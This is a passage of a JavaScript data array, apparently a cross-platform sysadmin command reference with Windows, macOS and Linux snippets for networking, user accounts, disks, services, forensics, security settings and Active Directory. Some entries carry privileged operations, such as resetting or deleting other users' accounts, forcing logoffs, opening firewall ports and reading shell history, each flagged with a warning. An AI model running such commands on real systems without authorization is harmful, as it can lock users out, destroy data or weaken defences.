  mac:`curl -sI https://example.com`,
  linux:`curl -sI https://example.com`
 }},
{id:"net-tls-cert", cat:"Network", title:"Inspect a server's TLS certificate",
 desc:"Subject, issuer, and validity dates for a host's cert. cmd/mac/linux use openssl.",
 code:{
  ps:`$h='example.com'; $p=443
$c=[System.Net.Sockets.TcpClient]::new($h,$p)
$s=[System.Net.Security.SslStream]::new($c.GetStream())
$s.AuthenticateAsClient($h)
[System.Security.Cryptography.X509Certificates.X509Certificate2]$s.RemoteCertificate |
  Select-Object Subject, Issuer, NotBefore, NotAfter, Thumbprint
$s.Dispose(); $c.Dispose()`,
  cmd:`openssl s_client -connect example.com:443 -servername example.com < NUL | openssl x509 -noout -subject -issuer -dates`,
  mac:`echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | openssl x509 -noout -subject -issuer -dates`,
  linux:`echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | openssl x509 -noout -subject -issuer -dates`
 }},
{id:"net-shares", cat:"Network", title:"Network shares & sessions",
 desc:"Local file shares being served and what's connected / mounted.",
 code:{
  ps:`Get-SmbShare | Select-Object Name, Path, Description
"-- sessions --"; Get-SmbSession | Select-Object ClientComputerName, ClientUserName, NumOpens`,
  cmd:`net share
echo -- sessions --
net session`,
  mac:`sharing -l 2>/dev/null
echo "-- mounted --"; mount | grep -i smbfs`,
  linux:`sudo smbstatus 2>/dev/null       # Samba server
sudo exportfs -v 2>/dev/null      # NFS exports
echo "-- mounted --"; mount | grep -E 'cifs|nfs'`
 }},
{id:"net-mapdrive", cat:"Network", title:"Map / mount a network share",
 desc:"Attach an SMB/CIFS share as a drive or mount point. Edit server/share/creds.",
 code:{
  ps:`New-SmbMapping -LocalPath 'Z:' -RemotePath '\\\\server\\share' -Persistent $true
# with creds: -UserName 'DOMAIN\\user' -Password 'pass'`,
  cmd:`net use Z: \\\\server\\share /persistent:yes
:: with creds: net use Z: \\\\server\\share password /user:DOMAIN\\user`,
  mac:`mkdir -p ~/mnt/share
mount_smbfs //user@server/share ~/mnt/share    # or: open smb://server/share`,
  linux:`sudo mkdir -p /mnt/share
sudo mount -t cifs //server/share /mnt/share -o username=USER   # needs cifs-utils`
 }},
{id:"net-proxy", cat:"Network", title:"Show proxy configuration",
 desc:"Current system/user HTTP(S) proxy settings.",
 code:{
  ps:`Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' |
  Select-Object ProxyEnable, ProxyServer, AutoConfigURL
netsh winhttp show proxy`,
  cmd:`netsh winhttp show proxy
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyServer`,
  mac:`scutil --proxy`,
  linux:`env | grep -i _proxy
gsettings get org.gnome.system.proxy mode 2>/dev/null`
 }},
{id:"net-adapter-toggle", cat:"Network", title:"Disable / re-enable a network adapter",
 desc:"Bounce a NIC to clear a stuck link. Edit the interface name.",
 danger:"Takes the interface down — you'll lose any remote session on it. Needs admin/root.",
 code:{
  ps:`Disable-NetAdapter -Name 'Ethernet' -Confirm:$false
Enable-NetAdapter  -Name 'Ethernet' -Confirm:$false`,
  cmd:`netsh interface set interface "Ethernet" admin=disable
netsh interface set interface "Ethernet" admin=enable`,
  mac:`sudo ifconfig en0 down && sudo ifconfig en0 up`,
  linux:`sudo ip link set eth0 down && sudo ip link set eth0 up`
 }},
{id:"net-stack-reset", cat:"Network", title:"Reset / restart the network stack",
 desc:"Last-resort fix for corrupted networking. Windows resets Winsock + TCP/IP.",
 danger:"Windows needs a reboot to finish. All: drops connectivity; needs admin/root.",
 code:{
  ps:`netsh winsock reset
netsh int ip reset
Clear-DnsClientCache
Write-Host "Reboot to complete."`,
  cmd:`netsh winsock reset
netsh int ip reset
ipconfig /flushdns
echo Reboot to complete.`,
  mac:`sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder
sudo ifconfig en0 down && sudo ifconfig en0 up`,
  linux:`sudo systemctl restart NetworkManager 2>/dev/null || sudo systemctl restart systemd-networkd`
 }},
{id:"net-wifi-scan", cat:"Network", title:"Scan nearby Wi-Fi networks",
 desc:"List visible SSIDs, signal, and channel.",
 code:{
  ps:`netsh wlan show networks mode=bssid`,
  cmd:`netsh wlan show networks mode=bssid`,
  mac:`# airport was removed in macOS 14.4+; on older builds:
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null ||
  system_profiler SPAirPortDataType`,
  linux:`nmcli dev wifi list 2>/dev/null || sudo iw dev wlan0 scan | grep -E 'SSID|signal'`
 }},

/* ---------- USERS & ACCESS (added) ---------- */
{id:"usr-whoami", cat:"Users & Access", title:"Current user, groups & privileges",
 desc:"Who am I, my group memberships, and (Windows) my privileges.",
 code:{
  ps:`whoami /all`,
  cmd:`whoami /all`,
  mac:`id
echo "groups: $(groups)"`,
  linux:`id
echo "groups: $(groups)"`
 }},
{id:"usr-passwd-reset", cat:"Users & Access", title:"Reset a user's password",
 desc:"Set a new password for an account. Edit the username.",
 danger:"Changes another user's credentials — authorized admin recovery only.",
 code:{
  ps:`$pw = Read-Host 'New password' -AsSecureString
Set-LocalUser -Name 'techuser' -Password $pw`,
  cmd:`net user techuser *`,
  mac:`sudo dscl . -passwd /Users/techuser`,
  linux:`sudo passwd techuser`
 }},
{id:"usr-disable", cat:"Users & Access", title:"Disable / enable an account",
 desc:"Lock an account out without deleting it (swap the verb to re-enable).",
 danger:"Blocks the user from logging in. Needs admin/root.",
 code:{
  ps:`Disable-LocalUser -Name 'techuser'
# re-enable: Enable-LocalUser -Name 'techuser'`,
  cmd:`net user techuser /active:no
:: re-enable: net user techuser /active:yes`,
  mac:`sudo pwpolicy -u techuser disableuser
# re-enable: sudo pwpolicy -u techuser enableuser`,
  linux:`sudo usermod -L techuser
# re-enable: sudo usermod -U techuser`
 }},
{id:"usr-unlock", cat:"Users & Access", title:"Unlock a locked-out account",
 desc:"Clear a lockout from too many failed logons.",
 danger:"Authorized admin recovery only. Needs admin/root.",
 code:{
  ps:`# Windows has no local 'unlock' cmdlet; a lockout clears after the lockout
# window, or immediately when you reset the password:
Set-LocalUser -Name 'techuser' -Password (Read-Host 'New password' -AsSecureString)`,
  cmd:`:: no native local unlock; reset the password to clear the lockout:
net user techuser *`,
  mac:`# force-clear by resetting the password:
sudo dscl . -passwd /Users/techuser`,
  linux:`sudo faillock --user techuser --reset   # pam_faillock
sudo usermod -U techuser                # also clears a password lock`
 }},
{id:"usr-delete", cat:"Users & Access", title:"Delete a local account",
 desc:"Remove a user. mac/linux options also delete the home directory.",
 danger:"Irreversible account (and home-folder) deletion. Needs admin/root.",
 code:{
  ps:`Remove-LocalUser -Name 'techuser'`,
  cmd:`net user techuser /delete`,
  mac:`sudo sysadminctl -deleteUser techuser`,
  linux:`sudo userdel -r techuser   # -r also removes the home directory`
 }},
{id:"usr-groups-of", cat:"Users & Access", title:"Groups a user belongs to",
 desc:"Enumerate the group memberships of a specific account. Edit the username.",
 code:{
  ps:`Get-LocalGroup | Where-Object {
  Get-LocalGroupMember $_.Name -Member 'techuser' -ErrorAction SilentlyContinue
} | Select-Object -ExpandProperty Name`,
  cmd:`net user techuser | findstr /C:"Local Group Memberships" /C:"Global Group"`,
  mac:`id techuser
groups techuser`,
  linux:`id techuser
groups techuser`
 }},
{id:"usr-lastlogon", cat:"Users & Access", title:"Last logon & password age",
 desc:"When accounts last signed in and when passwords were last changed.",
 code:{
  ps:`Get-LocalUser |
  Select-Object Name, Enabled, LastLogon, PasswordLastSet, PasswordExpires`,
  cmd:`net user techuser | findstr /C:"Last logon" /C:"Password last set" /C:"Password expires"`,
  mac:`last | head -20
# password last set:
sudo dscl . -read /Users/techuser accountPolicyData 2>/dev/null`,
  linux:`lastlog
echo "-- password aging --"; sudo chage -l techuser`
 }},
{id:"usr-policy", cat:"Users & Access", title:"Password & lockout policy",
 desc:"Minimum length, expiry, and lockout thresholds in effect.",
 code:{
  ps:`net accounts`,
  cmd:`net accounts`,
  mac:`sudo pwpolicy getaccountpolicies 2>/dev/null | tail -n +2`,
  linux:`grep -E '^PASS_(MAX|MIN|WARN)' /etc/login.defs
echo "-- lockout (pam_faillock) --"; grep -h faillock /etc/pam.d/* 2>/dev/null | sort -u`
 }},
{id:"usr-logoff", cat:"Users & Access", title:"Force-logoff a session",
 desc:"Disconnect / sign out another user's session. Get the session id first.",
 danger:"Ends the session immediately — unsaved work is lost. Needs admin/root.",
 code:{
  ps:`query user
# then log off by ID:
logoff 2`,
  cmd:`query user
logoff 2`,
  mac:`# terminate a user's GUI + processes:
sudo launchctl bootout user/$(id -u techuser) 2>/dev/null || sudo pkill -KILL -u techuser`,
  linux:`loginctl terminate-user techuser   # or: sudo pkill -KILL -u techuser`
 }},
{id:"usr-lock", cat:"Users & Access", title:"Lock the screen now",
 desc:"Immediately lock the current session.",
 code:{
  ps:`rundll32.exe user32.dll,LockWorkStation`,
  cmd:`rundll32.exe user32.dll,LockWorkStation`,
  mac:`/System/Library/CoreServices/"Menu Extras"/User.menu/Contents/Resources/CGSession -suspend`,
  linux:`loginctl lock-session 2>/dev/null || xdg-screensaver lock`
 }},

/* ---------- DISK & FILES (added) ---------- */
{id:"disk-tree", cat:"Disk & Files", title:"Folder size breakdown",
 desc:"Total size of each immediate subfolder — find what's eating a directory.",
 code:{
  ps:`Get-ChildItem -Directory | ForEach-Object {
  $mb=[math]::Round(((Get-ChildItem $_.FullName -Recurse -File -ErrorAction SilentlyContinue |
    Measure-Object Length -Sum).Sum)/1MB,1)
  [pscustomobject]@{Folder=$_.Name; MB=$mb}
} | Sort-Object MB -Descending`,
  mac:`du -h -d1 . | sort -h`,
  linux:`du -h --max-depth=1 . | sort -h`,
  py:`import os
for d in sorted(os.scandir("."), key=lambda e: e.name):
    if d.is_dir():
        tot=sum(os.path.getsize(os.path.join(r,f))
                for r,_,fs in os.walk(d.path) for f in fs
                if os.path.exists(os.path.join(r,f)))
        print(f"{tot/1048576:10.1f} MB  {d.name}")`
 }},
{id:"disk-smart", cat:"Disk & Files", title:"Drive SMART / health status",
 desc:"Physical disk health — early warning of a failing drive.",
 code:{
  ps:`Get-PhysicalDisk |
  Select-Object FriendlyName, MediaType, HealthStatus, OperationalStatus,
    @{n='Size_GB';e={[math]::Round($_.Size/1GB)}}`,
  cmd:`wmic diskdrive get model,status
:: wmic is deprecated; PowerShell Get-PhysicalDisk is preferred`,
  mac:`diskutil info disk0 | grep -i "SMART"`,
  linux:`sudo smartctl -H /dev/sda   # needs smartmontools`
 }},
{id:"file-search-text", cat:"Disk & Files", title:"Search text inside files",
 desc:"Recursively find files containing a string, with line numbers.",
 code:{
  ps:`Get-ChildItem -Recurse -File -ErrorAction SilentlyContinue |
  Select-String -Pattern 'searchterm' |
  Select-Object Path, LineNumber, Line`,
  cmd:`findstr /s /i /n "searchterm" *.*`,
  mac:`grep -rniI "searchterm" .`,
  linux:`grep -rniI "searchterm" .`,
  py:`import pathlib
term="searchterm"
for p in pathlib.Path(".").rglob("*"):
    if p.is_file():
        try:
            for i,line in enumerate(p.open('r',errors='ignore'),1):
                if term in line: print(f"{p}:{i}: {line.rstrip()}")
        except OSError: pass`
 }},
{id:"file-zip", cat:"Disk & Files", title:"Create / extract a zip archive",
 desc:"Zip a folder and unzip an archive. Edit the paths.",
 code:{
  ps:`Compress-Archive -Path .\\folder\\* -DestinationPath out.zip -Force
# extract:
Expand-Archive -Path out.zip -DestinationPath .\\dest -Force`,
  cmd:`tar -a -c -f out.zip folder
:: extract:
tar -x -f out.zip`,
  mac:`zip -r out.zip folder
unzip out.zip -d dest`,
  linux:`zip -r out.zip folder      # or: tar -czf out.tar.gz folder
unzip out.zip -d dest       # or: tar -xzf out.tar.gz`,
  py:`import shutil
shutil.make_archive("out","zip","folder")   # -> out.zip
shutil.unpack_archive("out.zip","dest")`
 }},
{id:"file-copy", cat:"Disk & Files", title:"Mirror / sync a folder",
 desc:"Efficiently copy a tree, only changed files. Edit src/dst.",
 danger:"/MIR and --delete make the destination match the source — extra files there are DELETED.",
 code:{
  ps:`robocopy .\\src .\\dst /MIR /R:1 /W:1
# drop /MIR for an additive copy (no deletes)`,
  cmd:`robocopy src dst /MIR /R:1 /W:1`,
  mac:`rsync -a --delete src/ dst/     # trailing slash on src matters`,
  linux:`rsync -a --delete src/ dst/     # drop --delete for an additive copy`
 }},
{id:"file-perms", cat:"Disk & Files", title:"View / change file permissions",
 desc:"Inspect ACLs/mode and grant access. Edit the target and principal.",
 danger:"Changing ownership or ACLs can lock users out of files. Others' files need elevation.",
 code:{
  ps:`Get-Acl .\\file | Format-List
# grant a user full control:
icacls .\\file /grant 'DOMAIN\\user:(F)'`,
  cmd:`icacls file
:: grant modify:
icacls file /grant user:(M)`,
  mac:`ls -le file
chmod 640 file
sudo chown user:staff file`,
  linux:`stat -c '%A %U:%G' file
chmod 640 file
sudo chown user:group file`
 }},

/* ---------- PROCESSES & SERVICES (added) ---------- */
{id:"proc-tree", cat:"Processes & Services", title:"Process tree (parent → child)",
 desc:"See process parentage — spot what spawned a suspicious child.",
 code:{
  ps:`Get-CimInstance Win32_Process |
  Select-Object ProcessId, ParentProcessId, Name |
  Sort-Object ParentProcessId, ProcessId`,
  cmd:`wmic process get Name,ProcessId,ParentProcessId
:: wmic deprecated; PowerShell Get-CimInstance Win32_Process is preferred`,
  mac:`ps -axo pid,ppid,user,command`,
  linux:`ps -e --forest -o pid,ppid,user,cmd    # or: pstree -p`
 }},
{id:"proc-find-port", cat:"Processes & Services", title:"Find the process using a port",
 desc:"Identify what's bound to a port — resolve 'address already in use'. Edit the port.",
 code:{
  ps:`Get-NetTCPConnection -LocalPort 443 |
  Select-Object LocalPort, State, OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}}`,
  cmd:`netstat -ano | findstr :443
:: map the PID from the last column:
tasklist /fi "PID eq 1234"`,
  mac:`sudo lsof -nP -iTCP:443`,
  linux:`sudo ss -tulpnH "sport = :443" || sudo lsof -nP -i:443`
 }},
{id:"svc-config", cat:"Processes & Services", title:"Set a service's start type",
 desc:"Enable, disable, or set a service to manual start. Edit the service name.",
 danger:"Disabling the wrong service can break the system. Needs admin/root.",
 code:{
  ps:`Set-Service -Name 'Spooler' -StartupType Automatic
# options: Automatic | Manual | Disabled`,
  cmd:`sc config Spooler start= auto
:: note the space after '=' ; options: auto | demand | disabled`,
  mac:`sudo launchctl enable system/org.cups.cupsd
# disable: sudo launchctl disable system/org.cups.cupsd`,
  linux:`sudo systemctl enable --now cups
# disable: sudo systemctl disable --now cups`
 }},
{id:"svc-failed", cat:"Processes & Services", title:"Failed / not-running auto services",
 desc:"Services set to auto-start that aren't running — post-boot triage.",
 code:{
  ps:`Get-Service | Where-Object { $_.StartType -eq 'Automatic' -and $_.Status -ne 'Running' } |
  Select-Object Name, DisplayName, Status`,
  mac:`# nonzero last-exit-status = a job that failed:
launchctl list | awk 'NR==1 || ($1!="-" && $2+0!=0)'`,
  linux:`systemctl --failed --no-pager`
 }},
{id:"sched-tasks", cat:"Processes & Services", title:"Scheduled tasks / cron jobs",
 desc:"Enumerate scheduled automation — a common persistence spot.",
 code:{
  ps:`Get-ScheduledTask | Where-Object State -ne 'Disabled' |
  Select-Object TaskPath, TaskName, State`,
  cmd:`schtasks /query /fo table /v`,
  mac:`crontab -l 2>/dev/null
launchctl list
ls ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons 2>/dev/null`,
  linux:`crontab -l 2>/dev/null
ls -la /etc/cron.d /etc/cron.daily 2>/dev/null
systemctl list-timers --all --no-pager`
 }},

/* ---------- FORENSICS (added) ---------- */
{id:"for-failed-logons", cat:"Forensics", title:"Failed logon attempts (Event 4625)",
 desc:"Recent failed sign-ins — brute-force / lockout investigation.",
 danger:"Requires administrator / root to read the security/auth logs.",
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 25 |
  Select-Object TimeCreated,
    @{n='User';e={$_.Properties[5].Value}},
    @{n='Source';e={$_.Properties[19].Value}}`,
  cmd:`wevtutil qe Security /q:"*[System[(EventID=4625)]]" /c:25 /rd:true /f:text`,
  mac:`log show --style syslog --last 1d --predicate 'eventMessage CONTAINS[c] "authentication failed"' 2>/dev/null | tail -20`,
  linux:`sudo lastb 2>/dev/null | head -20
sudo grep -Ei 'failed password|authentication failure' /var/log/auth.log /var/log/secure 2>/dev/null | tail -20`
 }},
{id:"for-dns-cache", cat:"Forensics", title:"Cached DNS resolver entries",
 desc:"Names the host resolved recently. Fully exposed only on Windows.",
 code:{
  ps:`Get-DnsClientCache | Select-Object Entry, Type, Data, TimeToLive`,
  cmd:`ipconfig /displaydns`,
  mac:`# not directly listable; dump mDNSResponder state to the unified log:
sudo killall -INFO mDNSResponder
log show --last 2m --predicate 'process == "mDNSResponder"' 2>/dev/null | grep -i cache | tail`,
  linux:`# systemd-resolved keeps no dumpable list; show stats:
resolvectl statistics 2>/dev/null || echo "no dumpable cache"`
 }},
{id:"for-history", cat:"Forensics", title:"Shell command history",
 desc:"Recent commands run in the shell — user-activity triage.",
 code:{
  ps:`Get-Content (Get-PSReadLineOption).HistorySavePath -Tail 50`,
  cmd:`doskey /history`,
  mac:`tail -50 ~/.zsh_history 2>/dev/null; tail -50 ~/.bash_history 2>/dev/null`,
  linux:`tail -50 ~/.bash_history 2>/dev/null; tail -50 ~/.zsh_history 2>/dev/null`
 }},
{id:"for-evtx-export", cat:"Forensics", title:"Export a log for offline analysis",
 desc:"Save a copy of a system log to a file. Edit output paths.",
 danger:"Reading full logs needs admin/root; writes a (potentially large) export file.",
 code:{
  ps:`wevtutil epl System "$env:USERPROFILE\\Desktop\\System.evtx"
# or CSV: Get-WinEvent -LogName System -MaxEvents 500 | Export-Csv System.csv -NoTypeInformation`,
  cmd:`wevtutil epl System "%USERPROFILE%\\Desktop\\System.evtx"`,
  mac:`log collect --last 1d --output ~/Desktop/system.logarchive`,
  linux:`sudo journalctl --since "1 day ago" > ~/journal-$(date +%F).txt`
 }},

/* ---------- SECURITY (added) ---------- */
{id:"sec-defender-scan", cat:"Security", title:"Run a Microsoft Defender scan",
 desc:"Kick off an on-demand antivirus scan (Windows).",
 danger:"Full scans are long and CPU/disk heavy.",
 code:{
  ps:`Start-MpScan -ScanType QuickScan
# full: Start-MpScan -ScanType FullScan`,
  cmd:`"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe" -Scan -ScanType 1`
 }},
{id:"sec-defender-update", cat:"Security", title:"Update Defender definitions",
 desc:"Pull the latest antivirus signatures (Windows).",
 code:{
  ps:`Update-MpSignature`,
  cmd:`"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe" -SignatureUpdate`
 }},
{id:"sec-defender-threats", cat:"Security", title:"Defender threat history",
 desc:"Malware Defender has detected on this machine (Windows).",
 code:{
  ps:`Get-MpThreat | Select-Object ThreatName, SeverityID, @{n='Detected';e={$_.InitialDetectionTime}}
Get-MpThreatDetection | Select-Object -First 20 ThreatID, ActionSuccess, ProcessName, InitialDetectionTime`
 }},
{id:"sec-encryption", cat:"Security", title:"Disk encryption status",
 desc:"Is the disk encrypted — BitLocker / FileVault / LUKS.",
 code:{
  ps:`Get-BitLockerVolume |
  Select-Object MountPoint, VolumeStatus, ProtectionStatus, EncryptionPercentage`,
  cmd:`manage-bde -status`,
  mac:`fdesetup status`,
  linux:`lsblk -o NAME,TYPE,FSTYPE,MOUNTPOINT | grep -i crypt
# details: sudo cryptsetup status <mapper-name>`
 }},
{id:"sec-firewall-rules", cat:"Security", title:"List firewall rules",
 desc:"Enumerate configured firewall rules.",
 code:{
  ps:`Get-NetFirewallRule -Enabled True |
  Select-Object DisplayName, Direction, Action, Profile |
  Sort-Object Direction, DisplayName`,
  cmd:`netsh advfirewall firewall show rule name=all`,
  mac:`sudo /usr/libexec/ApplicationFirewall/socketfilterfw --listapps
sudo pfctl -sr 2>/dev/null`,
  linux:`sudo ufw status numbered 2>/dev/null || sudo iptables -S || sudo nft list ruleset`
 }},
{id:"sec-firewall-addrule", cat:"Security", title:"Add a firewall rule",
 desc:"Allow inbound traffic on a port. Edit port/name.",
 danger:"Opens an inbound hole in the firewall. Needs admin/root.",
 code:{
  ps:`New-NetFirewallRule -DisplayName 'Allow TCP 8080' -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow`,
  cmd:`netsh advfirewall firewall add rule name="Allow TCP 8080" dir=in action=allow protocol=TCP localport=8080`,
  mac:`# app-based firewall; allow a binary to accept connections:
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /path/to/app
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp /path/to/app`,
  linux:`sudo ufw allow 8080/tcp   # or: sudo iptables -A INPUT -p tcp --dport 8080 -j ACCEPT`
 }},
{id:"sec-rdp-status", cat:"Security", title:"Remote access (RDP/SSH) status",
 desc:"Whether remote desktop / remote login is enabled and who may connect.",
 code:{
  ps:`$deny=(Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server').fDenyTSConnections
"RDP enabled: $([bool](1-$deny))"
Get-LocalGroupMember 'Remote Desktop Users' -ErrorAction SilentlyContinue | Select-Object Name`,
  cmd:`reg query "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections
net localgroup "Remote Desktop Users"`,
  mac:`sudo systemsetup -getremotelogin
launchctl list com.apple.screensharing >/dev/null 2>&1 && echo "Screen Sharing: on"`,
  linux:`systemctl is-active sshd ssh 2>/dev/null
systemctl is-active xrdp 2>/dev/null`
 }},
{id:"sec-uac", cat:"Security", title:"UAC configuration",
 desc:"User Account Control state and elevation prompt behavior (Windows).",
 code:{
  ps:`Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' |
  Select-Object EnableLUA, ConsentPromptBehaviorAdmin, PromptOnSecureDesktop`,
  cmd:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin`
 }},
{id:"sec-secureboot", cat:"Security", title:"Secure Boot & TPM status",
 desc:"Firmware secure-boot state and TPM/secure-enclave presence. Confirm-SecureBootUEFI needs admin.",
 code:{
  ps:`try { "SecureBoot: " + (Confirm-SecureBootUEFI) } catch { "SecureBoot: legacy BIOS or N/A" }
Get-Tpm | Select-Object TpmPresent, TpmReady, TpmEnabled`,
  cmd:`tpmtool getdeviceinformation`,
  mac:`csrutil status
system_profiler SPiBridgeDataType 2>/dev/null`,
  linux:`mokutil --sb-state 2>/dev/null
ls /sys/class/tpm/ 2>/dev/null && echo "TPM present"`
 }},
{id:"sec-audit-policy", cat:"Security", title:"Audit / logging policy",
 desc:"What security events are being audited.",
 code:{
  ps:`auditpol /get /category:*`,
  cmd:`auditpol /get /category:*`,
  mac:`sudo cat /etc/security/audit_control 2>/dev/null
sudo launchctl list com.apple.auditd >/dev/null 2>&1 && echo "auditd: on"`,
  linux:`sudo auditctl -l 2>/dev/null || echo "auditd not installed/active"
systemctl is-active auditd 2>/dev/null`
 }},

/* ---------- MAINTENANCE (added) ---------- */
{id:"mnt-reboot", cat:"Maintenance", title:"Reboot / shutdown (scheduled)",
 desc:"Restart or power off, optionally after a delay.",
 danger:"Ends all sessions and reboots/powers off the machine.",
 code:{
  ps:`shutdown /r /t 60          # reboot in 60s ; /s = shutdown ; /a = abort
# immediate: Restart-Computer -Force`,
  cmd:`shutdown /r /t 60
:: abort a pending shutdown: shutdown /a`,
  mac:`sudo shutdown -r +1        # reboot in 1 min ; -h to halt
# cancel: sudo killall shutdown`,
  linux:`sudo shutdown -r +1 "rebooting"   # -h to power off
# cancel: sudo shutdown -c`
 }},
{id:"mnt-chkdsk", cat:"Maintenance", title:"Check / repair a disk",
 desc:"Scan a filesystem for errors. Online scan is safe; repair needs the volume offline.",
 danger:"Repair (/f, repairVolume, fsck without -n) alters the filesystem and may need a reboot/unmount.",
 code:{
  ps:`Repair-Volume -DriveLetter C -Scan
# offline repair (schedules for reboot): Repair-Volume -DriveLetter C -OfflineScanAndFix`,
  cmd:`chkdsk C: /scan
:: full repair (reboot): chkdsk C: /f /r`,
  mac:`diskutil verifyVolume /
# repair the boot volume from Recovery: diskutil repairVolume /`,
  linux:`sudo fsck -n /dev/sda1        # -n = read-only check
# repair an UNMOUNTED fs: sudo fsck -y /dev/sda1`
 }},
{id:"mnt-diskcleanup", cat:"Maintenance", title:"Reclaim disk space",
 desc:"Clear caches, old updates, and logs to free space.",
 danger:"Permanently deletes cached files, old package data, and rotated logs.",
 code:{
  ps:`cleanmgr /sagerun:1
Dism /Online /Cleanup-Image /StartComponentCleanup`,
  cmd:`cleanmgr
Dism /Online /Cleanup-Image /StartComponentCleanup`,
  mac:`# thin local Time Machine snapshots + run system maintenance:
tmutil listlocalsnapshots / 2>/dev/null
sudo periodic daily weekly monthly`,
  linux:`sudo journalctl --vacuum-time=7d
sudo apt-get clean && sudo apt-get autoremove   # Debian/Ubuntu (dnf: sudo dnf clean all)`
 }},
{id:"mnt-update-check", cat:"Maintenance", title:"Check / install updates",
 desc:"List available updates, then optionally install them.",
 danger:"Installing updates changes software and may force a reboot. Needs admin/root.",
 code:{
  ps:`winget upgrade
# install everything: winget upgrade --all
# (OS/quality updates: Settings > Windows Update, or the PSWindowsUpdate module)`,
  cmd:`winget upgrade
:: install all: winget upgrade --all`,
  mac:`softwareupdate -l
# install all: sudo softwareupdate -ia --restart`,
  linux:`sudo apt update && apt list --upgradable
# install: sudo apt upgrade -y        (dnf: sudo dnf upgrade)`
 }},
{id:"mnt-restore-point", cat:"Maintenance", title:"Create a system restore point",
 desc:"Snapshot system state before risky changes (Windows; System Restore must be enabled).",
 danger:"Requires an elevated prompt; no-op if System Protection is disabled for the drive.",
 code:{
  ps:`Checkpoint-Computer -Description 'Field service' -RestorePointType MODIFY_SETTINGS`,
  cmd:`wmic.exe /Namespace:\\\\root\\default Path SystemRestore Call CreateRestorePoint "Field service", 100, 7`
 }},
{id:"mnt-gpupdate", cat:"Maintenance", title:"Force Group Policy refresh",
 desc:"Re-apply machine & user Group Policy immediately (Windows domain).",
 code:{
  ps:`gpupdate /force
# see applied policy: gpresult /r`,
  cmd:`gpupdate /force
:: report: gpresult /r`
 }},
{id:"mnt-print-queue", cat:"Maintenance", title:"Clear a stuck print queue",
 desc:"Purge jammed print jobs and bounce the spooler.",
 danger:"Deletes all pending print jobs. Windows step needs admin.",
 code:{
  ps:`Stop-Service Spooler -Force
Remove-Item "$env:SystemRoot\\System32\\spool\\PRINTERS\\*" -Force -ErrorAction SilentlyContinue
Start-Service Spooler`,
  cmd:`net stop spooler
del /q /f "%SystemRoot%\\System32\\spool\\PRINTERS\\*.*"
net start spooler`,
  mac:`cancel -a -        # cancel jobs on all printers (CUPS)`,
  linux:`cancel -a         # CUPS: cancel all jobs`
 }},
{id:"mnt-printers", cat:"Maintenance", title:"List printers & default",
 desc:"Installed printers and which one is the default.",
 code:{
  ps:`Get-Printer | Select-Object Name, DriverName, PortName, Shared, PrinterStatus
"Default: " + (Get-CimInstance Win32_Printer | Where-Object Default).Name`,
  cmd:`wmic printer get name,default,portname
:: wmic deprecated; prefer PowerShell Get-Printer`,
  mac:`lpstat -p -d`,
  linux:`lpstat -p -d`
 }},
{id:"mnt-event-errors", cat:"Maintenance", title:"Recent system errors & warnings",
 desc:"Critical/error log entries from the last day — post-incident triage.",
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='System'; Level=1,2; StartTime=(Get-Date).AddDays(-1)} -MaxEvents 25 |
  Select-Object TimeCreated, Id, ProviderName, LevelDisplayName`,
  cmd:`wevtutil qe System /q:"*[System[(Level=1 or Level=2)]]" /c:25 /rd:true /f:text`,
  mac:`log show --last 1d --predicate 'messageType == 16 || messageType == 17' 2>/dev/null | tail -30`,
  linux:`journalctl -p err -b --no-pager | tail -30`
 }},
{id:"mnt-clip", cat:"Maintenance", title:"Copy output / file to clipboard",
 desc:"Pipe text or a file straight into the system clipboard.",
 code:{
  ps:`Get-Content .\\file.txt -Raw | Set-Clipboard
# or: "some text" | Set-Clipboard`,
  cmd:`clip < file.txt
:: or: echo some text | clip`,
  mac:`pbcopy < file.txt
# or: echo "some text" | pbcopy`,
  linux:`xclip -selection clipboard < file.txt   # X11 (or: wl-copy < file.txt on Wayland)`
 }},

/* ---------- ACTIVE DIRECTORY (added) — PowerShell; needs RSAT + domain ---------- */
{id:"ad-userfind", cat:"Active Directory", title:"Find an AD user",
 desc:"Search AD for a user and key account flags. Needs RSAT ActiveDirectory module + domain.",
 code:{
  ps:`Get-ADUser -Filter "Name -like '*smith*'" -Properties Enabled,LockedOut,LastLogonDate |
  Select-Object Name, SamAccountName, Enabled, LockedOut, LastLogonDate`,
  cmd:`dsquery user -name "*smith*"`
 }},
{id:"ad-unlock", cat:"Active Directory", title:"Unlock / reset an AD account",
 desc:"Clear a lockout and optionally force a password reset. Needs RSAT + delegated rights.",
 danger:"Changes another user's account state/credentials — authorized admins only.",
 code:{
  ps:`Unlock-ADAccount -Identity jsmith
# force a reset at next logon:
Set-ADAccountPassword -Identity jsmith -Reset
Set-ADUser -Identity jsmith -ChangePasswordAtLogon $true`
 }},
{id:"ad-groupmembers", cat:"Active Directory", title:"List AD group members",
 desc:"Enumerate members of a domain group (recursively). Needs RSAT + domain.",
 code:{
  ps:`Get-ADGroupMember -Identity 'Domain Admins' -Recursive |
  Select-Object Name, SamAccountName, objectClass`,
  cmd:`net group "Domain Admins" /domain`
 }},
